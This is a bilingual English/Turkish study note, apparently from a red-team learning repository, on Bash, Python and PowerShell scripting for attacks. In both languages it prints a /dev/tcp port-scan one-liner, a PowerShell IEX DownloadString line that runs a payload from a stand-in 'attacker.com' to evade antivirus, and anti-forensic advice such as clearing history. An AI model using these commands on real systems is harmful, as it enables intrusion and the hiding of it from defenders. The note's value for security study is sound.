# 📜 Scripting: Automation & Weaponization / Otomasyon ve Silahlanma

> **Motto:** "A cybersecurity analyst uses tools; a hacker builds them."  
> **Motto:** "Bir siber güvenlik uzmanı araç kullanır, bir hacker araç yazar."

---

## 🇬🇧 English: Strategic Scripting & Operational Coding

### 1. Strategic Foundations: Why We Script?
In cybersecurity, scripting is not about software development; it is about **operational capability**.

* **Force Multiplier:** Reducing a task that takes 1 hour manually (e.g., scanning 1000 IPs) to 10 seconds.
* **Living off the Land (LotL):** Using the system's native languages (Bash, PowerShell) to execute attacks without uploading external binaries (which trigger AVs).
* **Protocol Manipulation:** Creating raw TCP/UDP packets to bypass Firewalls/WAFs when standard tools fail.
* **Proof of Concept (PoC):** Rapidly writing code to verify a newly published CVE.

### 2. The Holy Trinity of Security Scripting

| Language | Platform | Domain of Expertise | Critical Feature |
| :--- | :--- | :--- | :--- |
| **BASH** | Linux / Unix | System Admin & Piping | Unrivaled in text processing (`sed`, `awk`) and chaining tools together. |
| **PYTHON** | Cross-Platform | Network, Exploit & Crypto | The standard for socket programming, packet manipulation (`scapy`), and API interaction. |
| **POWERSHELL** | Windows | Active Directory & Post-Exp. | Direct access to Windows APIs. Capable of **Fileless Execution** (running in RAM). |

### 3. Advanced Techniques & Logic

#### A. BASH: The Glue of Linux
Bash is about **Command Orchestration**.
* **I/O Redirection:** Manipulating `stdout`/`stderr` and using file descriptors for networking.
    * *Concept:* Everything is a file, even a network connection (`/dev/tcp`).
* **One-Liner Scanning:**
    ```bash
    # Scan ports 1-65535 without nmap
    for port in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/192.168.1.10/$port" && echo "Port $port Open"; done 2>/dev/null
    ```

#### B. PYTHON: The Swiss Army Knife
Used for low-level network interaction.
* **Raw Sockets:** Sending data directly to the wire.
    ```python
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("target_ip", 80))
    s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n") # Manually crafting HTTP
    ```

#### C. POWERSHELL: The Windows Empire
The key to modern Windows hacking (Red Teaming).
* **Fileless Malware:** Executing code directly into memory without touching the hard drive to avoid Anti-Virus detection.
    ```powershell
    # Loads a script from the internet into RAM and executes it
    IEX(New-Object Net.WebClient).DownloadString('[http://attacker.com/payload.ps1](http://attacker.com/payload.ps1)')
    ```

### 4. OPSEC (Operational Security) Rules
1.  **Minimize Disk I/O:** Every file written to the disk leaves a forensic artifact. **Stay in RAM.**
2.  **Clean Up:** Always remove temporary files (`/tmp`) and clear history (`history -c`) after execution.
3.  **No Dependencies:** Your script must run with **Standard Libraries**. You cannot run `pip install` on a victim machine.

---

<br>

## 🇹🇷 Türkçe: Stratejik Kodlama ve Operasyonel Mantık

### 1. Stratejik Temeller: Neden Script Yazarız?
Siber güvenlikte script yazmanın amacı ürün geliştirmek değil, **sonuç almaktır**.

* **Güç Çarpanı (Force Multiplier):** Manuel olarak saatler sürecek taramaları saniyelere indirmek.
* **Living off the Land (LotL):** Hedef sisteme dışarıdan `.exe` sokmadan, sistemin kendi dillerini (Bash, PowerShell) kullanarak saldırı yapmak (Antivirüsleri atlatmak için).
* **Protokol Manipülasyonu:** Standart araçların yapamadığı özel paketleri (Raw TCP/UDP) oluşturup Güvenlik Duvarlarını atlatmak.
* **Exploit Geliştirme (PoC):** Yeni çıkan bir zafiyet (CVE) için hızlıca çalışan bir kanıt kodu yazmak.

### 2. Siber Güvenliğin Kutsal Üçlüsü

| Dil | Platform | Uzmanlık Alanı | Kritik Özellik |
| :--- | :--- | :--- | :--- |
| **BASH** | Linux / Unix | Sistem Yönetimi & Borulama | Metin işleme (`sed`, `awk`) ve araçları birbirine bağlama konusunda rakipsizdir. |
| **PYTHON** | Cross-Platform | Ağ, Exploit & Kriptografi | Soket programlama, paket manipülasyonu (`scapy`) ve API etkileşimi için standarttır. |
| **POWERSHELL** | Windows | Active Directory & Post-Exp. | Windows API'lerine doğrudan erişim sağlar. **Dosyasız (Fileless)** çalışabilir. |

### 3. İleri Düzey Teknikler ve Mantık

#### A. BASH: Linux'un Tutkalı
Bash, **Komut Orkestrasyonu** demektir.
* **I/O Yönlendirme:** Çıktıları manipüle etmek ve dosya tanımlayıcılarını ağ işlemleri için kullanmak.
    * *Mantık:* Linux'ta her şey bir dosyadır, internet bağlantısı bile (`/dev/tcp`).
* **Tek Satırlık Tarama (One-Liner):**
    ```bash
    # Nmap olmadan tüm portları tarama mantığı
    for port in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/192.168.1.10/$port" && echo "Port $port Açık"; done 2>/dev/null
    ```

#### B. PYTHON: İsviçre Çakısı
Düşük seviyeli ağ etkileşimi için kullanılır.
* **Ham Soketler (Raw Sockets):** Veriyi manipüle ederek göndermek.
    ```python
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("target_ip", 80))
    s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n") # HTTP isteğini manuel oluşturma
    ```

#### C. POWERSHELL: Windows İmparatorluğu
Modern Windows sızma testlerinin kalbidir.
* **Dosyasız Zararlı (Fileless Malware):** Antivirüslere yakalanmamak için diske hiç dokunmadan, kodu doğrudan RAM'e indirip çalıştırmak.
    ```powershell
    # İnternetteki zararlıyı diske indirmeden RAM'de çalıştırır
    IEX(New-Object Net.WebClient).DownloadString('[http://attacker.com/payload.ps1](http://attacker.com/payload.ps1)')
    ```

### 4. OPSEC (Operasyonel Güvenlik) Kuralları
1.  **Disk I/O Minimize Et:** Diske yazılan her dosya, adli bilişim (forensic) izi bırakır. **RAM'de kal.**
2.  **Temizlik:** İşlem bitince geçici dosyaları (`/tmp`) sil ve geçmişi (`history -c`) temizle.
3.  **Bağımlılık Yok:** Scriptlerin hedef sistemin **Standart Kütüphaneleri** ile çalışmalı. Kurban makinede `pip install` yapamazsın.